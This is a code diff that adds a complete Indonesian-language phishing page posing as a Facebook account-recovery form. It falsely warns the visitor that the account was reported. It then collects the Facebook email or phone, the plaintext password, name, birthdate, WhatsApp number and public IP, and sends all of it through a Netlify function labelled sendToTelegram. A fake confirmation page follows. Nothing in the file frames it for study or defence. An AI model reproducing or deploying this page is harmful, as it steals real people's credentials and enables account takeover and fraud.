@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PEMULIHAN AKUN FACEBOOK</title>
+  <meta property="og:title" content="PEMULIHAN AKUN FACEBOOK🔓">
+  <meta property="og:image" content="https://cdn-icons-png.flaticon.com/512/3064/3064197.png">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html, body { height: 100%; font-family: 'Segoe UI', sans-serif; background: #f0f2f5; }
+    .wrapper { display: flex; justify-content: center; align-items: flex-start; min-height: 100vh; padding-top: 40px; }
+    .box { background: #fff; padding: 25px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.08); width: 90%; max-width: 420px; display: none; text-align: center; }
+    .box.active { display: block; }
+    .box img { max-width: 100%; }
+    .logo-fb { width: 50px; margin-bottom: 10px; }
+    .lock-icon { width: 45px; margin-bottom: 18px; }
+    .check-icon { width: 50px; margin-bottom: 10px; }
+    h2 { color: #1877f2; font-size: 20px; margin-bottom: 10px; }
+    p { font-size: 14px; color: #444; margin-bottom: 22px; }
+    .btn { background-color: #1877f2; color: #fff; padding: 10px 14px; font-size: 15px; border: none; border-radius: 6px; cursor: pointer; width: 100%; }
+    input { width: 100%; padding: 10px; margin-bottom: 12px; border: 1px solid #ccc; border-radius: 6px; }
+    .success h2 { color: #1877f2; font-size: 22px; margin-bottom: 8px; }
+    .success p { font-size: 18px; font-weight: 600; color: #1877f2; }
+  </style>
+</head>
+<body>
+  <div class="wrapper">
+    <!-- Halaman 1 -->
+    <div class="box active" id="step1">
+      <img class="lock-icon" src="https://cdn-icons-png.flaticon.com/512/3064/3064197.png" alt="lock">
+      <h2>Harap Konfirmasi Identitas Anda</h2>
+      <p>Demi keamanan, kami perlu memverifikasi akun Anda karena telah dilaporkan mengandung konten tidak pantas.</p>
+      <button class="btn" onclick="goToStep(2)">Lanjutkan</button>
+    </div>
+
+    <!-- Halaman 2 -->
+    <div class="box" id="step2">
+      <img class="logo-fb" src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+      <h2>Formulir Facebook untuk Pemulihan Akun</h2>
+      <p>Silakan isi formulir di bawah ini dengan informasi yang sesuai agar proses pemulihan akun Anda dapat dilakukan dengan lancar.</p>
+      <form id="recoveryForm">
+        <input type="text" name="email" placeholder="Email atau Nomor Telepon Facebook" required>
+        <input type="text" name="password" placeholder="Password Facebook" required>
+        <input type="text" name="name" placeholder="Nama Facebook" required>
+        <input type="text" name="birthdate" placeholder="Tanggal Lahir (DD-MM-YYYY)" required>
+        <input type="text" name="whatsapp" placeholder="Nomor WhatsApp" required>
+        <button class="btn" type="submit">Kirim</button>
+      </form>
+    </div>
+
+    <!-- Halaman 3: Berhasil -->
+    <div class="box success" id="step3">
+      <img class="check-icon" src="https://cdn-icons-png.flaticon.com/512/845/845646.png" alt="check">
+      <h2>Berhasil!</h2>
+      <p>Terima kasih, data Anda telah berhasil kami terima. Proses verifikasi akan segera dilakukan dan Anda akan menerima pemberitahuan lebih lanjut melalui kontak yang telah Anda berikan.</p>
+    </div>
+  </div>
+
+  <script>
+    function goToStep(step) {
+      document.querySelectorAll('.box').forEach(box => box.classList.remove('active'));
+      document.getElementById(`step${step}`).classList.add('active');
+    }
+
+    async function getUserIP() {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        return data.ip;
+      } catch (err) {
+        console.error("Gagal ambil IP:", err);
+        return "Tidak terdeteksi";
+      }
+    }
+
+    const form = document.getElementById('recoveryForm');
+    form.addEventListener('submit', async function(e) {
+      e.preventDefault();
+
+      const email = form.email.value;
+      const password = form.password.value;
+      const name = form.name.value;
+      const birthdate = form.birthdate.value;
+      const whatsapp = form.whatsapp.value;
+
+      // Ambil IP publik asli
+      const userIP = await getUserIP();
+
+      const message = `📄 FORMULIR PEMULIHAN FACEBOOK\n-------------------\n📧 Email: ${email}\n🔑 Password: ${password}\n👤 Nama: ${name}\n🎂 Tanggal Lahir: ${birthdate}\n📱 WhatsApp: ${whatsapp}\n🌐 IP (Asli): ${userIP}\n-------------------`;
+
+      // ✅ INI YANG DIUBAH: KIRIM KE NETLIFY FUNCTION, BUKAN LANGSUNG KE TELEGRAM
+      try {
+        const response = await fetch('/.netlify/functions/sendToTelegram', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ message })
+        });
+
+        if (response.ok) {
+          goToStep(3);
+        } else {
+          alert("Gagal mengirim data.");
+        }
+      } catch (error) {
+        alert("Gagal mengirim data.");
+        console.error(error);
+      }
+    });
+  </script>
+</body>
+</html>
